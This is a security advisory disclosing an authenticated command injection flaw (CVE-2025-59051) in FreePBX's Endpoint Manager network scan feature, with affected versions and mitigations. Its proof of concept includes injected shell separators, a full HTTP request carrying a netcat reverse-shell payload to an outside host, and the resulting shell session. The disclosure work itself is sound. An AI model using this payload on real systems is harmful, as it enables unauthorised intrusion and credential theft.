# FreePBX: Authenticated Command Injection in Network Scanning feature of Endpoint Manager

- **Advisory ID:** MCSAID-2025-006
- **CVE ID:** CVE-2025-59051
- **Product:** FreePBX (https://www.freepbx.org)
- **Reported:** 2025-08-30
- **Published:** 2025-10-20
- **Severity:** High
- **CWE:** [CWE-78:  Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
- **Discovered by:** Ivan Racic of Marlink Cyber

---

## Summary

The Endpoint Manager module includes a Network Scanning feature that provides web-based access to nmap functionality for network device discovery. Insufficiently sanitized user-supplied input allows authenticated OS command execution as the asterisk user.

---

## Affected Versions

| Version                                       | Status                    |
| --------------------------------------------- | ------------------------- |
| Endpoint Module < 16.0.92                     | Vulnerable                |
| Endpoint Module < 17.0.6.38                   | Vulnerable                |
| Endpoint Module 16.0.92                       | Patched                   |
| Endpoint Module 17.0.6.38                     | Patched                   |

---


## Proof of Concept

After authenticating to the FreePBX admin interface, navigate to Settings -> EndPoint Manager -> Network scan. In the "Scan this Subnet (x.x.x.x/x):" insert / append any of the shell meta-characters or command separators / operators (i.e. &, ;, `` or |), and press "Scan This Subnet". One example of the command would be ; sleep 10 which will result in 10 second timeout.
Also, ; touch pwn can be used, which will create a file named pwn in the /var/www/html/admin/.

```
[root@freepbx admin]# ls -la $PWD/pwn
-rw-r--r-- 1 asterisk asterisk 0 Aug 30 06:54 /var/www/html/admin/pwn
```

Reverse shell: 
```
POST /admin/config.php?display=endpoint&view=nmap HTTP/1.1
Host: <redacted>
Cookie: <redacted>
User-Agent: Mozilla/5.0 <redacted> Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://<redacted>/admin/config.php?display=endpoint&view=nmap
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Origin: https://<redacted>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

network=%3B+nc+192.168.1.10+4444+-e+%2Fbin%2Fbash&action=scan

```

On the listening server reverse shell is obtained:


```
nc -klnvp 4444
Listening on 0.0.0.0 4444
Connection received on <redacted> 40302
id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
hostname
freepbx.sangoma.local
uname -a
Linux freepbx.sangoma.local 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
---

## Impact

Any user that has admin access to the EndPoint Manager Add-on (Admin -> Administrators -> Access Restrictions -> Admin Access -> Selected -> EndPoint Manager) can execute arbitrary operating system commands, which is not intended and breaks the security boundary. With the privileges of the asterisk user, an attacker can enumerate the operating system, obtain credentials from /etc/freepbx.conf, access the MySQL database, dump password hashes or disrupt the service.

---

## Mitigations

* Update to the latest fixed version of the endpoint module.
* Protect your ACP from suspicious users.
* Remove users that should not have access.
* Firewall your FreePBX ACP HTTP/HTTPS/GraphQL ports.

---

## References

* FreePBX Security Advisory: https://github.com/FreePBX/security-reporting/security/advisories/GHSA-qgj3-f9gj-98v9